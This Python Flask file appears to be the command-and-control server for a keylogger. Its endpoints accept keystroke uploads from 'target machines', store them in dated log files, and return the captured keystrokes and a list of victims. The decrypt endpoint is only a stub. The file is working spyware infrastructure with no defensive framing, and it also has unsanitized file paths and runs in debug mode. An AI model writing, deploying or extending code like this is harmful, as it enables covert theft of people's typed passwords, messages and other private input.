import os
from flask import Flask, jsonify, request, json
from flask_cors import CORS
import time
from KeyLoggerAgent import encryptor

DATA_FOLDER = "data"

def generate_log_filename():
    return "log_" + time.strftime("%Y-%m-%d") + ".txt"

app = Flask('app')
CORS(app)

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    print(data)
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400
    machine = data["machine"]
    log_data = data["data"]

    machine_folder = os.path.join(DATA_FOLDER, next(iter(machine)))
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    if os.path.exists(file_path):
        with open(file_path, "r+", encoding="utf-8") as f:
            file_data = json.load(f)
            new_entry = {
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "data": log_data
            }
            file_data[time.strftime("%Y-%m-%d") + " data:"].append(new_entry)
            f.seek(0)
            f.write(json.dumps(file_data, indent=4, sort_keys=False) + "\n")
    else:
        with open(file_path, "w", encoding="utf-8") as f:
            json_data = {
                time.strftime("%Y-%m-%d") + " data:": [
                    {
                        "timestamp": timestamp,
                        "data": log_data
                    }
                ]
            }
            f.write(json.dumps(json_data, indent=4, sort_keys=False) + "\n")

    return jsonify({"status": "success", "file": file_path, "data": log_data}), 200



@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    machines = os.listdir(DATA_FOLDER)
    return jsonify({"machines": machines}), 200

@app.route('/api/get_keystrokes', methods=['GET'])
def get_target_machine_key_strokes():
    target_machine = request.args.get('target_machine')
    if not target_machine:
        return jsonify({"error": "Missing target_machine parameter"}), 400

    machine_folder = os.path.join(DATA_FOLDER, target_machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    files = os.listdir(machine_folder)
    files.sort(reverse=True)
    data = []
    for file in files:
        with open(os.path.join(machine_folder, file), "r", encoding="utf-8") as f:
            file_data = json.load(f)
            for key, value in file_data.items():
                for entry in value:
                    data.append(entry)
    return jsonify({"data": data}), 200

@app.route('/api/decrypt_data', methods=['GET'])
def decrypt_data():

    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
 app.run(debug=True)
